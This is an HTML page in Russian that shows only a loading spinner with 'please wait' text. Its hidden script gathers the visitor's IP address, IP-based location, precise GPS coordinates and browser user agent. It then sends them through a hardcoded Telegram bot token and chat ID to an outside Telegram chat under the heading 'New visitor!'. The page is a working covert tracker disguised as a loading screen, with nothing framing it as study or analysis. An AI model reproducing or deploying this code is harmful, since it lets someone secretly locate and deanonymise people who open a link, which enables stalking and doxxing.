<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0f0f1a, #1a1a2e);
            font-family: system-ui, -apple-system, sans-serif;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .loader {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 50px 40px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00e6b8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
            color: #00e6b8;
            margin-bottom: 10px;
        }
        p {
            font-size: 18px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h2>Пожалуйста, подождите</h2>
        <p>Страница загружается...</p>
    </div>
    <script>
        const TOKEN = '7959565855:AAGXvmUb-T1pPCjYJJRFXcEkE8PFVvJQXSM';
        const CHAT_ID = '1391249960';

        (async () => {
            let ip = 'неизвестен';
            try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}

            let geo = 'не определено';
            try {
                const d = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
                geo = d.city ? `${d.city}, ${d.region}, ${d.country_name}` : geo;
            } catch(e){}

            let gps = '';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => { gps = `\n📍 GPS: ${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)} (±${Math.round(p.coords.accuracy)}м)`; },
                    () => {},
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
            setTimeout(async () => {
                const msg = `🕵️ Новый посетитель!\n\nIP: <code>${ip}</code>\n🌍 ${geo}${gps}\n\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`;
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
                });
            }, 6000);
        })();
    </script>
</body>
</html>
